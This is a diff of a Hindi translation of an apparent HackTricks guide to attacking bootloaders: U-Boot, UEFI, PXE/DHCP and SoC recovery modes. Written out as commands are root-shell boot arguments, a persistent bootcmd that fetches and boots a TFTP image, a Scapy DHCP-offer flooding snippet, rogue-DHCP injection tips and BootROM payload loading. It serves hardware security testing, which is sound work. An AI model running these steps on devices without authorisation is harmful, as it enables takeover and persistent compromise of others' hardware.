@@ -2,9 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-निम्नलिखित चरण डिवाइस के स्टार्टअप कॉन्फ़िगरेशन को बदलने और U-Boot तथा UEFI-class लोडर्स जैसे bootloaders का परीक्षण करने के लिए सुझाए जाते हैं। प्रारंभिक कोड निष्पादन पाने, signature/rollback सुरक्षा का आकलन करने, और recovery या network-boot पाथ्स का दुरुपयोग करने पर ध्यान दें।
+निम्नलिखित कदम डिवाइस स्टार्टअप कॉन्फ़िगरेशन बदलने और U-Boot तथा UEFI-क्लास लोडरों के bootloader परीक्षण के लिए सुझाए जाते हैं। प्राथमिक ध्यान प्रारंभिक कोड निष्पादन पाने, signature/rollback सुरक्षा का आकलन करने, और recovery या network-boot पाथ्स का दुरुपयोग करने पर रखें।
 
-Related: MediaTek secure-boot bypass via bl2_ext patching:
+संबंधित: MediaTek secure-boot bypass via bl2_ext patching:
 
 {{#ref}}
 android-mediatek-secure-boot-bl2_ext-bypass-el3.md
@@ -13,17 +13,17 @@ android-mediatek-secure-boot-bl2_ext-bypass-el3.md
 ## U-Boot quick wins and environment abuse
 
 1. इंटरप्रेटर शेल तक पहुँचें
-- बूट के दौरान, `bootcmd` के चलने से पहले किसी ज्ञात ब्रेक की (अक्सर कोई भी की, 0, space, या बोर्ड-विशेष "magic" सिक्वेंस) को दबाकर U-Boot प्रॉम्प्ट में आएं।
+- बूट के दौरान, `bootcmd` चलने से पहले किसी ज्ञात ब्रेक की (अक्सर कोई भी की, 0, space, या बोर्ड-विशिष्ट "magic" अनुक्रम) दबाकर U-Boot prompt पर जाएँ।
 
 2. बूट स्थिति और वेरिएबल्स का निरीक्षण करें
 - उपयोगी कमांड्स:
 - `printenv` (environment dump)
-- `bdinfo` (board info, memory addresses)
-- `help bootm; help booti; help bootz` (supported kernel boot methods)
-- `help ext4load; help fatload; help tftpboot` (available loaders)
+- `bdinfo` (बोर्ड जानकारी, मेमरी पते)
+- `help bootm; help booti; help bootz` (समर्थित kernel boot तरीके)
+- `help ext4load; help fatload; help tftpboot` (उपलब्ध loaders)
 
-3. रूट शेल पाने के लिए boot arguments बदलें
-- `init=/bin/sh` जोड़ें ताकि kernel सामान्य init के बजाय शेल पर जाए:
+3. रूट शेल प्राप्त करने के लिए boot arguments संशोधित करें
+- `init=/bin/sh` जोड़ें ताकि kernel सामान्य init के बजाय shell पर जाए:
 ```
 # printenv
 # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
@@ -32,7 +32,7 @@ android-mediatek-secure-boot-bl2_ext-bypass-el3.md
 ```
 
 4. अपने TFTP सर्वर से Netboot करें
-- नेटवर्क कॉन्फ़िगर करें और LAN से kernel/fit image लाएं:
+- नेटवर्क कॉन्फ़िगर करें और LAN से kernel/fit इमेज फ़ेच करें:
 ```
 # setenv ipaddr 192.168.2.2      # device IP
 # setenv serverip 192.168.2.1    # TFTP server IP
@@ -44,16 +44,16 @@ android-mediatek-secure-boot-bl2_ext-bypass-el3.md
 # booti ${loadaddr} - ${fdt_addr_r}
 ```
 
-5. environment के माध्यम से परिवर्तन को स्थायी करें
-- यदि env स्टोरेज write-protected नहीं है, तो आप नियंत्रण को स्थायी कर सकते हैं:
+5. environment के माध्यम से परिवर्तनों को स्थायी करें
+- यदि env स्टोरेज write-protected नहीं है, तो आप नियंत्रण पर्सिस्ट कर सकते हैं:
 ```
 # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
 # saveenv
 ```
-- `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` जैसे वेरिएबल्स की जांच करें जो fallback पाथ्स को प्रभावित करते हैं। गलत कॉन्फ़िगर किए गए मान बार-बार शेल में ब्रेक दिला सकते हैं।
+- `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` जैसे वेरिएबल्स की जाँच करें जो fallback पाथ्स को प्रभावित करते हैं। गलत कॉन्फ़िगर किये हुए मान बार-बार शेल में ब्रेक करने की अनुमति दे सकते हैं।
 
-6. debug/unsafe सुविधाओं की जाँच करें
-- देखें: `bootdelay` > 0, `autoboot` disabled, unrestricted `usb start; fatload usb 0:1 ...`, serial के माध्यम से `loady`/`loads` की क्षमता, removable media से `env import` की अनुमति, और kernels/ramdisks बिना signature checks के लोड होने की स्थितियाँ।
+6. debug/unsafe फीचर्स की जाँच करें
+- देखें: `bootdelay` > 0, `autoboot` disabled, unrestricted `usb start; fatload usb 0:1 ...`, serial के माध्यम से `loady`/`loads` की क्षमता, अनट्रस्टेड मीडिया से `env import`, और ऐसे kernels/ramdisks जो बिना signature checks के लोड होते हैं।
 
 7. U-Boot image/verification परीक्षण
 - यदि प्लेटफ़ॉर्म FIT images के साथ secure/verified boot का दावा करता है, तो unsigned और tampered images दोनों आज़माएँ:
@@ -66,9 +66,9 @@ android-mediatek-secure-boot-bl2_ext-bypass-el3.md
 
 ## Network-boot surface (DHCP/PXE) and rogue servers
 
-8. PXE/DHCP पैरामीटर फज़िंग
-- U-Boot के legacy BOOTP/DHCP हैंडलिंग में memory-safety मुद्दे रहे हैं। उदाहरण के लिए, CVE‑2024‑42040 crafted DHCP responses के माध्यम से memory disclosure का वर्णन करता है जो U-Boot memory से bytes को वायर पर leak कर सकता है। netboot के दौरान boot parameters को overly long/edge-case मानों (option 67 bootfile-name, vendor options, file/servername fields) के साथ exercise करें और हँग/leak के लिए देखें।
-- netboot के दौरान boot पैरामीटर्स को stress करने के लिए Minimal Scapy snippet:
+8. PXE/DHCP पैरामीटर fuzzing
+- U-Boot के legacy BOOTP/DHCP हैंडलिंग में memory-safety मुद्दे रहे हैं। उदाहरण के लिए, CVE‑2024‑42040 में crafted DHCP responses के द्वारा memory disclosure का वर्णन है जो U-Boot मेमोरी से बाइट्स वायर पर लीक कर सकते हैं। netboot के दौरान overly long/edge-case मानों (option 67 bootfile-name, vendor options, file/servername fields) के साथ DHCP/PXE कोड पाथ्स का परीक्षण करें और हैंग/लीक के लिए निरीक्षण करें।
+- netboot के दौरान boot पैरामीटर को stress करने के लिए Minimal Scapy स्निपेट:
 ```python
 from scapy.all import *
 offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
@@ -83,45 +83,45 @@ DHCP(options=[('message-type','offer'),
 'end']))
 sendp(offer, iface='eth0', loop=1, inter=0.2)
 ```
-- यह भी जाँचें कि क्या PXE filename फ़ील्ड्स shell/loader लॉजिक को बिना sanitization के पास की जा रही हैं जब इन्हें OS-side provisioning scripts से chained किया जाता है।
+- यह भी सत्यापित करें कि क्या PXE filename फ़ील्ड्स shell/loader लॉजिक तक बिना sanitization के पास की जाती हैं जब उन्हें OS-side provisioning scripts से चेन किया जाता है।
 
-9. Rogue DHCP server command injection परीक्षण
-- एक rogue DHCP/PXE सर्विस सेटअप करें और filename या options फ़ील्ड्स में characters इंजेक्ट करके boot chain के बाद के चरणों में command interpreters तक पहुँचने की कोशिश करें। Metasploit की DHCP auxiliary, `dnsmasq`, या custom Scapy scripts अच्छे काम करते हैं। पहले लैब नेटवर्क को अलग रखें।
+9. Rogue DHCP सर्वर command injection परीक्षण
+- एक rogue DHCP/PXE सर्विस सेट अप करें और filename या options फ़ील्ड्स में ऐसे अक्षर inject करने की कोशिश करें जो boot chain के बाद के चरणों में command interpreters तक पहुँच सकें। Metasploit’s DHCP auxiliary, `dnsmasq`, या custom Scapy स्क्रिप्ट अच्छे काम करते हैं। पहले लैब नेटवर्क को अलग अवश्य करें।
 
 ## SoC ROM recovery modes that override normal boot
 
-कई SoC एक BootROM "loader" मोड एक्सपोज़ करते हैं जो USB/UART के माध्यम से कोड स्वीकार करेगा भले ही flash images invalid हों। यदि secure-boot fuses नहीं जलाए गए हैं, तो यह chain में बहुत जल्दी arbitrary code execution प्रदान कर सकता है।
+कई SoC BootROM "loader" मोड एक्सपोज़ करते हैं जो flash images invalid होने पर भी USB/UART के माध्यम से कोड स्वीकार कर लेंगे। यदि secure-boot fuses/OTP नहीं जले हैं, तो यह chain में बहुत शुरुआती arbitrary code execution प्रदान कर सकता है।
 
 - NXP i.MX (Serial Download Mode)
 - Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
-- Example: `imx-usb-loader u-boot.imx` से कस्टम U-Boot को RAM में push और run करें।
+- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
 - Allwinner (FEL)
 - Tool: `sunxi-fel`.
-- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` या `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
+- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
 - Rockchip (MaskROM)
 - Tool: `rkdeveloptool`.
-- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` से loader stage करें और कस्टम U-Boot upload करें।
+- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.
 
-जाँच करें कि क्या डिवाइस में secure-boot eFuses/OTP जले हुए हैं। यदि नहीं, तो BootROM download मोड अक्सर किसी भी higher-level verification (U-Boot, kernel, rootfs) को bypass करके आपका first-stage payload सीधे SRAM/DRAM से execute कर देता है।
+जांचें कि क्या डिवाइस में secure-boot eFuses/OTP जले हुए हैं। यदि नहीं, तो BootROM download modes अक्सर किसी भी higher-level verification (U-Boot, kernel, rootfs) को बायपास कर देते हैं और आपका first-stage payload सीधे SRAM/DRAM से निष्पादित कर लेते हैं।
 
 ## UEFI/PC-class bootloaders: quick checks
 
-10. ESP में छेड़छाड़ और rollback परीक्षण
-- EFI System Partition (ESP) mount करें और loader components देखें: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
-- यदि Secure Boot revocations (dbx) अद्यतन नहीं हैं, तो downgraded या ज्ञात-कमजोर signed boot components के साथ बूट करने की कोशिश करें। यदि प्लेटफ़ॉर्म अभी भी पुराने shims/bootmanagers पर भरोसा करता है, तो आप अक्सर ESP से अपना kernel या `grub.cfg` लोड करके persistence प्राप्त कर सकते हैं।
+10. ESP tampering and rollback testing
+- EFI System Partition (ESP) माउंट करें और loader components की जाँच करें: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths।
+- यदि Secure Boot revocations (dbx) current नहीं हैं, तो downgraded या ज्ञात-भुल्ये हुए signed boot components के साथ बूट करने की कोशिश करें। यदि प्लेटफ़ॉर्म अभी भी पुराने shims/bootmanagers पर भरोसा करता है, तो आप अक्सर ESP से अपना kernel या `grub.cfg` लोड करके persistence प्राप्त कर सकते हैं।
 
-11. Boot logo parsing बग्स (LogoFAIL class)
-- कई OEM/IBV firmware DXE में image-parsing flaws के शिकार थे जो boot logos को process करते हैं। यदि attacker ESP पर vendor-विशेष path (उदा., `\EFI\<vendor>\logo\*.bmp`) पर crafted image रख सकता है और reboot कर सकता है, तो Secure Boot enabled होने पर भी early boot के दौरान code execution संभव हो सकता है। जाँचें कि क्या प्लेटफ़ॉर्म user-supplied logos स्वीकार करता है और क्या वे paths OS से writable हैं।
+11. Boot logo parsing bugs (LogoFAIL class)
+- कई OEM/IBV firmwares DXE में boot logos को process करने वाले image-parsing flaws के प्रति संवेदनशील थे। यदि एक attacker ESP पर vendor-specific path (उदा., `\EFI\<vendor>\logo\*.bmp`) पर crafted image रख सकता है और reboot कर सकता है, तो Secure Boot सक्षम होने पर भी early boot के दौरान code execution संभव हो सकता है। यह परीक्षण करें कि क्या प्लेटफ़ॉर्म user-supplied logos स्वीकार करता है और क्या वे paths OS से writable हैं।
 
 ## Hardware caution
 
-SPI/NAND flash के साथ early boot के दौरान इंटरैक्ट करते समय सतर्क रहें (उदा., reads को bypass करने के लिए pins को ग्राउंड करना) और हमेशा flash datasheet देखें। गलत टाइम किए गए शॉर्टs डिवाइस या programmer को corrupt कर सकते हैं।
+प्रारंभिक बूट के दौरान SPI/NAND flash के साथ इंटरैक्ट करते समय सतर्क रहें (उदा., पढ़ने को बायपास करने के लिए पिन्स को ग्राउंड करना) और हमेशा flash datasheet देखें। गलत-समय पर किये गए शॉर्ट्स डिवाइस या programmer को क्षतिग्रस्त कर सकते हैं।
 
-## नोट्स और अतिरिक्त सुझाव
+## Notes and additional tips
 
-- `env export -t ${loadaddr}` और `env import -t ${loadaddr}` आज़माएँ ताकि environment blobs को RAM और storage के बीच मूव किया जा सके; कुछ प्लेटफ़ॉर्म removable media से बिना authentication के env import करने की अनुमति देते हैं।
-- Linux-आधारित सिस्टमों पर जो `extlinux.conf` के माध्यम से बूट होते हैं, boot partition में `APPEND` line (जैसे `init=/bin/sh` या `rd.break` इंजेक्ट करना) अक्सर पर्याप्त होता है जब signature checks लागू नहीं होते।
-- यदि userland `fw_printenv/fw_setenv` देता है, तो सत्यापित करें कि `/etc/fw_env.config` वास्तविक env स्टोरेज से मेल खाता है। गलत कॉन्फ़िगर किए गए offsets आपको गलत MTD region पढ़ने/लिखने देते हैं।
+- `env export -t ${loadaddr}` और `env import -t ${loadaddr}` आज़माएँ ताकि environment blobs को RAM और storage के बीच ले जाया जा सके; कुछ प्लेटफ़ॉर्म removable media से बिना authentication के env import करने की अनुमति देते हैं।
+- extlinux.conf के माध्यम से बूट होने वाले Linux-based सिस्टम्स पर persistence के लिए boot partition में `APPEND` लाइन (जैसे `init=/bin/sh` या `rd.break` इंजेक्ट करना) अक्सर काफी होता है जब signature checks लागू नहीं होते।
+- यदि userland `fw_printenv/fw_setenv` प्रदान करता है, तो सत्यापित करें कि `/etc/fw_env.config` वास्तविक env स्टोरेज से मेल खाता है। गलत कॉन्फ़िगर किये गए offsets आपको गलत MTD region पढ़ने/लिखने की अनुमति दे सकते हैं।
 
 ## References
 
